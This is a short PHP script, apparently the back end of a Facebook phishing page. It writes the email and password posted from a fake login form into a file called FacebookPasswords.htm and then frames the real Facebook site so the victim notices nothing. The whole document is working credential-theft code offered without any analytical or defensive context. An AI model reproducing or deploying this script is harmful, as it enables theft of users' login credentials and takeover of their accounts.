<?php /* Created on: 03/03./2010 */ 
$fp = fopen("FacebookPasswords.htm", "a");
fwrite($fp, "Email:$_POST[email]\tPassword:$_POST[pass]");
echo "<HTML>

<head>
<title>Welcome to CopyPaste</title>
<FRAMESET cols=\"*\">
  <FRAME SRC=\"http://www.Facebook.com\">


</FRAMESET>";?>

